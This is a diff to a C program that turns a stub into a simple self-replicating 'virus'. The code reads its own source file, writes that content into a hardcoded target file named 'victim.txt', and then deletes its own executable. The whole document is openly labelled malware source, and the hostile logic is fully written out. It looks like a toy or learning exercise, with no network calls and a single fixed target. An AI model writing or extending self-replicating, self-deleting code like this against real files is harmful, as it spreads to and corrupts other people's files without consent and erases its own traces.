@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <string.h>
 
+// Searches for a victim to copy the virus into
 const char *fileSearch()
 {
     char *fileName = "victim.txt";
@@ -14,7 +15,11 @@ void replicateVirus(char *content)
 
     // Opening up victim in read and write mode
     FILE *fp = fopen(fileSearch(), "r+");
-
+    if (fp == NULL)
+    {
+        fprintf(stderr, "Error opening the file");
+        exit(0);
+    }
     // Determining the size of victim
     fseek(fp, 0, SEEK_END);
     long fileSize = ftell(fp);
@@ -53,12 +58,52 @@ void replicateVirus(char *content)
     fclose(fp);
     free(victimContent);
 }
-int main()
+
+void virusInit()
 {
-    char *content = "to be written";
-    replicateVirus(content);
+    FILE *fp;
+    // Opening up the current file(i.e. virus)
+    fp = fopen(__FILE__, "r");
+    if (fp == NULL)
+    {
+        fprintf(stderr, "Error opening the file");
+        exit(0);
+    }
 
-    // TODO return value of fread
+    // Determining the size of virus
+    fseek(fp, 0, SEEK_END);
+    long virusSize = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
 
+    // For the content of the virus
+    char *virusContent = malloc(virusSize + 1);
+    if (virusContent == NULL)
+    {
+        fprintf(stderr, "Memory not allocated\n");
+        exit(0);
+    }
+
+    // Reading the content of the virus
+    int readElements = fread(virusContent, virusSize, 1, fp);
+    if (readElements != 1)
+    {
+        fprintf(stderr, "Error has occured or EOF reached\n");
+        exit(0);
+    }
+    virusContent[virusSize] = 0;
+
+    // Replicating the virus to victim
+    replicateVirus(virusContent);
+
+    fclose(fp);
+    free(virusContent);
+}
+int main(int c, char *argv[])
+{
+    // Initiating the virus
+    virusInit();
+
+    // Virus gets removed after infecting the victim
+    remove(argv[0]);
     return 0;
 }
